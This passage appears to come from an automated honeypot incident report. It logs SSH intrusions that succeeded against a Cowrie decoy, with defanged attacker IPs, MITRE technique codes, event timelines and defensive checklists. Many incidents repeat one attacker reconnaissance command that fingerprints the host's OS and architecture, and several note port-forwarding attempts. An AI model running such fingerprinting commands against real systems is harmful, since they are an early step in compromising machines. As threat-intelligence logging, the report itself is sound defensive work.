| `2026-07-11 11:35:33` | `cowrie.command.input` |
| `2026-07-11 11:35:33` | `cowrie.log.closed` |
| `2026-07-11 11:35:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36df43f331a0

| Field | Detail |
|---|---|
| **Source IP** | `171.231.192[.]229` |
| **First Seen** | 2026-07-11 11:36 |
| **Last Seen** | 2026-07-11 11:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:36:03` | `cowrie.session.connect` |
| `2026-07-11 11:36:03` | `cowrie.client.version` |
| `2026-07-11 11:36:03` | `cowrie.client.kex` |
| `2026-07-11 11:36:05` | `cowrie.login.success` |
| `2026-07-11 11:36:05` | `cowrie.direct-tcpip.request` |
| `2026-07-11 11:36:05` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-11 11:36:05` | `cowrie.direct-tcpip.data` |
| `2026-07-11 11:36:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.192[.]229` to AbuseIPDB if not already reported
- [ ] Block `171.231.192[.]229` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdcaaf2c521b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:37 |
| **Last Seen** | 2026-07-11 11:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:37:18` | `cowrie.session.connect` |
| `2026-07-11 11:37:18` | `cowrie.client.version` |
| `2026-07-11 11:37:18` | `cowrie.client.kex` |
| `2026-07-11 11:37:19` | `cowrie.login.success` |
| `2026-07-11 11:37:20` | `cowrie.session.params` |
| `2026-07-11 11:37:20` | `cowrie.command.input` |
| `2026-07-11 11:37:20` | `cowrie.command.input` |
| `2026-07-11 11:37:20` | `cowrie.command.input` |
| `2026-07-11 11:37:20` | `cowrie.command.input` |
| `2026-07-11 11:37:20` | `cowrie.command.input` |
| `2026-07-11 11:37:20` | `cowrie.command.success` |
| `2026-07-11 11:37:20` | `cowrie.command.input` |
| `2026-07-11 11:37:20` | `cowrie.command.input` |
| `2026-07-11 11:37:20` | `cowrie.command.input` |
| `2026-07-11 11:37:20` | `cowrie.command.input` |
| `2026-07-11 11:37:20` | `cowrie.log.closed` |
| `2026-07-11 11:37:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42c90159903c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:39 |
| **Last Seen** | 2026-07-11 11:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:39:12` | `cowrie.session.connect` |
| `2026-07-11 11:39:12` | `cowrie.client.version` |
| `2026-07-11 11:39:12` | `cowrie.client.kex` |
| `2026-07-11 11:39:12` | `cowrie.login.success` |
| `2026-07-11 11:39:13` | `cowrie.session.params` |
| `2026-07-11 11:39:13` | `cowrie.command.input` |
| `2026-07-11 11:39:13` | `cowrie.command.input` |
| `2026-07-11 11:39:13` | `cowrie.command.input` |
| `2026-07-11 11:39:13` | `cowrie.command.input` |
| `2026-07-11 11:39:13` | `cowrie.command.input` |
| `2026-07-11 11:39:13` | `cowrie.command.success` |
| `2026-07-11 11:39:13` | `cowrie.command.input` |
| `2026-07-11 11:39:13` | `cowrie.command.input` |
| `2026-07-11 11:39:13` | `cowrie.command.input` |
| `2026-07-11 11:39:13` | `cowrie.command.input` |
| `2026-07-11 11:39:13` | `cowrie.log.closed` |
| `2026-07-11 11:39:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d23a85177fa6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:41 |
| **Last Seen** | 2026-07-11 11:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:41:02` | `cowrie.session.connect` |
| `2026-07-11 11:41:02` | `cowrie.client.version` |
| `2026-07-11 11:41:02` | `cowrie.client.kex` |
| `2026-07-11 11:41:03` | `cowrie.login.success` |
| `2026-07-11 11:41:04` | `cowrie.session.params` |
| `2026-07-11 11:41:04` | `cowrie.command.input` |
| `2026-07-11 11:41:04` | `cowrie.command.input` |
| `2026-07-11 11:41:04` | `cowrie.command.input` |
| `2026-07-11 11:41:04` | `cowrie.command.input` |
| `2026-07-11 11:41:04` | `cowrie.command.input` |
| `2026-07-11 11:41:04` | `cowrie.command.success` |
| `2026-07-11 11:41:04` | `cowrie.command.input` |
| `2026-07-11 11:41:04` | `cowrie.command.input` |
| `2026-07-11 11:41:04` | `cowrie.command.input` |
| `2026-07-11 11:41:04` | `cowrie.command.input` |
| `2026-07-11 11:41:04` | `cowrie.log.closed` |
| `2026-07-11 11:41:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-622dae58cf3e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:42 |
| **Last Seen** | 2026-07-11 11:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:42:54` | `cowrie.session.connect` |
| `2026-07-11 11:42:54` | `cowrie.client.version` |
| `2026-07-11 11:42:54` | `cowrie.client.kex` |
| `2026-07-11 11:42:55` | `cowrie.login.success` |
| `2026-07-11 11:42:56` | `cowrie.session.params` |
| `2026-07-11 11:42:56` | `cowrie.command.input` |
| `2026-07-11 11:42:56` | `cowrie.command.input` |
| `2026-07-11 11:42:56` | `cowrie.command.input` |
| `2026-07-11 11:42:56` | `cowrie.command.input` |
| `2026-07-11 11:42:56` | `cowrie.command.input` |
| `2026-07-11 11:42:56` | `cowrie.command.success` |
| `2026-07-11 11:42:56` | `cowrie.command.input` |
| `2026-07-11 11:42:56` | `cowrie.command.input` |
| `2026-07-11 11:42:56` | `cowrie.command.input` |
| `2026-07-11 11:42:56` | `cowrie.command.input` |
| `2026-07-11 11:42:56` | `cowrie.log.closed` |
| `2026-07-11 11:42:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-affa8c63d1ae

| Field | Detail |
|---|---|
| **Source IP** | `122.166.253[.]226` |
| **First Seen** | 2026-07-11 11:43 |
| **Last Seen** | 2026-07-11 11:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:43:47` | `cowrie.session.connect` |
| `2026-07-11 11:43:47` | `cowrie.client.version` |
| `2026-07-11 11:43:47` | `cowrie.client.kex` |
| `2026-07-11 11:43:50` | `cowrie.login.success` |
| `2026-07-11 11:43:50` | `cowrie.direct-tcpip.request` |
| `2026-07-11 11:43:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.166.253[.]226` to AbuseIPDB if not already reported
- [ ] Block `122.166.253[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1231716697c5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:44 |
| **Last Seen** | 2026-07-11 11:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:44:48` | `cowrie.session.connect` |
| `2026-07-11 11:44:48` | `cowrie.client.version` |
| `2026-07-11 11:44:48` | `cowrie.client.kex` |
| `2026-07-11 11:44:49` | `cowrie.login.success` |
| `2026-07-11 11:44:50` | `cowrie.session.params` |
| `2026-07-11 11:44:50` | `cowrie.command.input` |
| `2026-07-11 11:44:50` | `cowrie.command.input` |
| `2026-07-11 11:44:50` | `cowrie.command.input` |
| `2026-07-11 11:44:50` | `cowrie.command.input` |
| `2026-07-11 11:44:50` | `cowrie.command.input` |
| `2026-07-11 11:44:50` | `cowrie.command.success` |
| `2026-07-11 11:44:50` | `cowrie.command.input` |
| `2026-07-11 11:44:50` | `cowrie.command.input` |
| `2026-07-11 11:44:50` | `cowrie.command.input` |
| `2026-07-11 11:44:50` | `cowrie.command.input` |
| `2026-07-11 11:44:50` | `cowrie.log.closed` |
| `2026-07-11 11:44:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e02a9b30cb17

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 11:46 |
| **Last Seen** | 2026-07-11 11:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:46:43` | `cowrie.session.connect` |
| `2026-07-11 11:46:44` | `cowrie.client.version` |
| `2026-07-11 11:46:44` | `cowrie.client.kex` |
| `2026-07-11 11:46:45` | `cowrie.login.success` |
| `2026-07-11 11:46:47` | `cowrie.session.params` |
| `2026-07-11 11:46:47` | `cowrie.command.input` |
| `2026-07-11 11:46:47` | `cowrie.log.closed` |
| `2026-07-11 11:46:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d5dfc80e09d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:46 |
| **Last Seen** | 2026-07-11 11:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:46:45` | `cowrie.session.connect` |
| `2026-07-11 11:46:45` | `cowrie.client.version` |
| `2026-07-11 11:46:45` | `cowrie.client.kex` |
| `2026-07-11 11:46:45` | `cowrie.login.success` |
| `2026-07-11 11:46:46` | `cowrie.session.params` |
| `2026-07-11 11:46:46` | `cowrie.command.input` |
| `2026-07-11 11:46:46` | `cowrie.command.input` |
| `2026-07-11 11:46:46` | `cowrie.command.input` |
| `2026-07-11 11:46:46` | `cowrie.command.input` |
| `2026-07-11 11:46:46` | `cowrie.command.input` |
| `2026-07-11 11:46:46` | `cowrie.command.success` |
| `2026-07-11 11:46:46` | `cowrie.command.input` |
| `2026-07-11 11:46:46` | `cowrie.command.input` |
| `2026-07-11 11:46:46` | `cowrie.command.input` |
| `2026-07-11 11:46:46` | `cowrie.command.input` |
| `2026-07-11 11:46:47` | `cowrie.log.closed` |
| `2026-07-11 11:46:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f59c2b7bac17

| Field | Detail |
|---|---|
| **Source IP** | `60.18.139[.]82` |
| **First Seen** | 2026-07-11 11:47 |
| **Last Seen** | 2026-07-11 11:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:47:15` | `cowrie.session.connect` |
| `2026-07-11 11:47:16` | `cowrie.client.version` |
| `2026-07-11 11:47:16` | `cowrie.client.kex` |
| `2026-07-11 11:47:18` | `cowrie.login.success` |
| `2026-07-11 11:47:19` | `cowrie.direct-tcpip.request` |
| `2026-07-11 11:47:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.18.139[.]82` to AbuseIPDB if not already reported
- [ ] Block `60.18.139[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eda25dd1a64e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:48 |
| **Last Seen** | 2026-07-11 11:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:48:37` | `cowrie.session.connect` |
| `2026-07-11 11:48:37` | `cowrie.client.version` |
| `2026-07-11 11:48:38` | `cowrie.client.kex` |
| `2026-07-11 11:48:38` | `cowrie.login.success` |
| `2026-07-11 11:48:39` | `cowrie.session.params` |
| `2026-07-11 11:48:39` | `cowrie.command.input` |
| `2026-07-11 11:48:39` | `cowrie.command.input` |
| `2026-07-11 11:48:39` | `cowrie.command.input` |
| `2026-07-11 11:48:39` | `cowrie.command.input` |
| `2026-07-11 11:48:39` | `cowrie.command.input` |
| `2026-07-11 11:48:39` | `cowrie.command.success` |
| `2026-07-11 11:48:39` | `cowrie.command.input` |
| `2026-07-11 11:48:39` | `cowrie.command.input` |
| `2026-07-11 11:48:39` | `cowrie.command.input` |
| `2026-07-11 11:48:39` | `cowrie.command.input` |
| `2026-07-11 11:48:39` | `cowrie.log.closed` |
| `2026-07-11 11:48:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-660626c66f19

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:50 |
| **Last Seen** | 2026-07-11 11:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:50:35` | `cowrie.session.connect` |
| `2026-07-11 11:50:35` | `cowrie.client.version` |
| `2026-07-11 11:50:35` | `cowrie.client.kex` |
| `2026-07-11 11:50:36` | `cowrie.login.success` |
| `2026-07-11 11:50:37` | `cowrie.session.params` |
| `2026-07-11 11:50:37` | `cowrie.command.input` |
| `2026-07-11 11:50:37` | `cowrie.command.input` |
| `2026-07-11 11:50:37` | `cowrie.command.input` |
| `2026-07-11 11:50:37` | `cowrie.command.input` |
| `2026-07-11 11:50:37` | `cowrie.command.input` |
| `2026-07-11 11:50:37` | `cowrie.command.success` |
| `2026-07-11 11:50:37` | `cowrie.command.input` |
| `2026-07-11 11:50:37` | `cowrie.command.input` |
| `2026-07-11 11:50:37` | `cowrie.command.input` |
| `2026-07-11 11:50:37` | `cowrie.command.input` |
| `2026-07-11 11:50:37` | `cowrie.log.closed` |
| `2026-07-11 11:50:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3a89f076f5e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:52 |
| **Last Seen** | 2026-07-11 11:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:52:42` | `cowrie.session.connect` |
| `2026-07-11 11:52:42` | `cowrie.client.version` |
| `2026-07-11 11:52:42` | `cowrie.client.kex` |
| `2026-07-11 11:52:42` | `cowrie.login.success` |
| `2026-07-11 11:52:43` | `cowrie.session.params` |
| `2026-07-11 11:52:43` | `cowrie.command.input` |
| `2026-07-11 11:52:43` | `cowrie.command.input` |
| `2026-07-11 11:52:43` | `cowrie.command.input` |
| `2026-07-11 11:52:43` | `cowrie.command.input` |
| `2026-07-11 11:52:43` | `cowrie.command.input` |
| `2026-07-11 11:52:43` | `cowrie.command.success` |
| `2026-07-11 11:52:43` | `cowrie.command.input` |
| `2026-07-11 11:52:43` | `cowrie.command.input` |
| `2026-07-11 11:52:43` | `cowrie.command.input` |
| `2026-07-11 11:52:43` | `cowrie.command.input` |
| `2026-07-11 11:52:43` | `cowrie.log.closed` |
| `2026-07-11 11:52:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15d4972b0d71

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:54 |
| **Last Seen** | 2026-07-11 11:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:54:41` | `cowrie.session.connect` |
| `2026-07-11 11:54:41` | `cowrie.client.version` |
| `2026-07-11 11:54:41` | `cowrie.client.kex` |
| `2026-07-11 11:54:42` | `cowrie.login.success` |
| `2026-07-11 11:54:43` | `cowrie.session.params` |
| `2026-07-11 11:54:43` | `cowrie.command.input` |
| `2026-07-11 11:54:43` | `cowrie.command.input` |
| `2026-07-11 11:54:43` | `cowrie.command.input` |
| `2026-07-11 11:54:43` | `cowrie.command.input` |
| `2026-07-11 11:54:43` | `cowrie.command.input` |
| `2026-07-11 11:54:43` | `cowrie.command.success` |
| `2026-07-11 11:54:43` | `cowrie.command.input` |
| `2026-07-11 11:54:43` | `cowrie.command.input` |
| `2026-07-11 11:54:43` | `cowrie.command.input` |
| `2026-07-11 11:54:43` | `cowrie.command.input` |
| `2026-07-11 11:54:43` | `cowrie.log.closed` |
| `2026-07-11 11:54:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
